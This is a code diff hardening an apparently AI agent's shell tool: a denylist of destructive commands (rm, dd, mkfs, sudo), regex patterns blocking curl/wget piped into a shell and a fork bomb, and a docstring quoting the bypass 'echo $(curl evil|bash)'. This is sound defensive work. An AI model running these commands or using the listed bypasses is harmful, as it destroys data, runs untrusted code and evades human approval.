@@ -17,16 +17,33 @@ from typing import Any, Dict, Optional
 
 from .base_tool import BaseTool
 from .persistent_shell import get_shell
+from src import security
 
-# Commands that are completely banned (mirrors BashTool prompt.ts BANNED_COMMANDS)
-BANNED_COMMANDS = [
-    "rm", "rmdir", "del", "format", "mkfs", "dd", "sudo", "su",
-    "chmod", "chown", "passwd", "shutdown", "reboot", "halt",
-    "killall", "pkill", ":{:|:&};:",  # fork bomb
-    "curl | bash", "wget | bash", "eval", "exec",
-]
+# Base command names that are completely banned (matched by normalized base
+# name so quoting / full paths / .exe cannot hide them — see
+# security.command_base_names).
+BANNED_COMMANDS = {
+    "rm", "rmdir", "del", "erase", "format", "mkfs", "dd", "sudo", "su",
+    "chmod", "chown", "passwd", "shutdown", "reboot", "halt", "poweroff",
+    "killall", "pkill", "taskkill",
+    "eval", "exec",
+    "mkfs.ext4", "diskpart",
+}
 
-# Commands that are known to be safe (mirrors permissions.ts SAFE_COMMANDS)
+#: Substring patterns that are dangerous regardless of base command (e.g.
+#: piping a download straight into a shell). Checked case-insensitively against
+#: the whole command.
+BANNED_PATTERNS = (
+    re.compile(r"\bcurl\b.*\|\s*(bash|sh|zsh|powershell|pwsh|cmd)\b", re.IGNORECASE),
+    re.compile(r"\bwget\b.*\|\s*(bash|sh|zsh|powershell|pwsh|cmd)\b", re.IGNORECASE),
+    re.compile(r"\biwr\b.*\|\s*(iex|invoke-expression)", re.IGNORECASE),
+    re.compile(r"invoke-expression", re.IGNORECASE),
+    re.compile(r":\(\)\s*\{.*\};:", re.IGNORECASE),  # fork bomb :(){ :|:& };:
+)
+
+# Commands that are known to be safe and never require approval. These are
+# matched as a complete command (base command + optional plain arguments) ONLY
+# when the command contains NO shell metacharacters — see is_command_safe.
 SAFE_COMMANDS = [
     "git status", "git diff", "git log", "git branch", "git show",
     "git fetch", "git remote",
@@ -97,38 +114,52 @@ def is_server_command(command: str) -> bool:
 
 
 def is_command_safe(command: str) -> bool:
-    """Check if command matches safe whitelist (prefix matching)."""
-    cmd_lower = command.lower().strip()
+    """Check if a command is safe enough to run without approval.
+
+    A command is only "safe" when BOTH conditions hold:
+      1. It contains NO shell metacharacters (no chaining, piping, redirection,
+         command substitution, or backgrounding) — this defeats the old
+         ``echo $(curl evil|bash)`` / ``cd && rm -rf`` prefix-bypass.
+      2. Its base command + arguments exactly match (token-wise) a SAFE_COMMANDS
+         entry, i.e. the whole command equals a safe entry or is that entry
+         followed by additional plain arguments.
+    """
+    if not command:
+        return False
+    if security.has_shell_metacharacters(command):
+        return False
+
+    normalized = " ".join(command.lower().split())
     for safe in SAFE_COMMANDS:
-        if cmd_lower.startswith(safe):
+        safe_norm = safe.lower()
+        if normalized == safe_norm or normalized.startswith(safe_norm + " "):
             return True
     return False
 
 
 def is_command_banned(command: str) -> tuple[bool, str]:
     """
-    Check if command contains a banned substring.
+    Check whether a command is banned for security reasons.
     Returns (is_banned, reason).
-    Mirrors BashTool.validateInput from scratch_repo.
-    """
-    # Strip trailing & before checking
-    clean = command.rstrip().rstrip("&").strip()
-    parts = []
-    current = ""
-    for char in clean:
-        if char in ("&", "|", ";"):
-            if current.strip():
-                parts.append(current.strip())
-            current = ""
-        else:
-            current += char
-    if current.strip():
-        parts.append(current.strip())
 
-    for part in parts:
-        base_cmd = part.split()[0].lower() if part.split() else ""
-        if base_cmd in BANNED_COMMANDS:
-            return True, f"Command '{base_cmd}' is not allowed for security reasons."
+    Two layers:
+      1. Dangerous whole-command patterns (e.g. ``curl ... | bash``, fork bombs).
+      2. A denylist of base command names, matched against the NORMALIZED base
+         name of every chain/pipe segment so quoting (``"rm"``), full paths
+         (``/bin/rm``), extensions (``rm.exe``), and leading env assignments
+         (``FOO=1 rm``) cannot bypass it.
+    """
+    if not command:
+        return False, ""
+
+    for pattern in BANNED_PATTERNS:
+        if pattern.search(command):
+            return True, "Command matches a dangerous pattern and is not allowed for security reasons."
+
+    for base in security.command_base_names(command):
+        if base in BANNED_COMMANDS:
+            return True, f"Command '{base}' is not allowed for security reasons."
+
     return False, ""
 
 
@@ -261,7 +292,7 @@ class BashTool(BaseTool):
             effective_timeout = min(timeout, BACKGROUND_CAPTURE_SECS)
 
         # 4. If not safe, request user approval
-        if not is_command_safe(clean_command) and os.environ.get("OMNI_AUTONOMOUS", "").lower() != "true":
+        if not is_command_safe(clean_command) and not security.is_autonomous():
             def _get_approval():
                 from rich.console import Console
                 from rich.prompt import Prompt
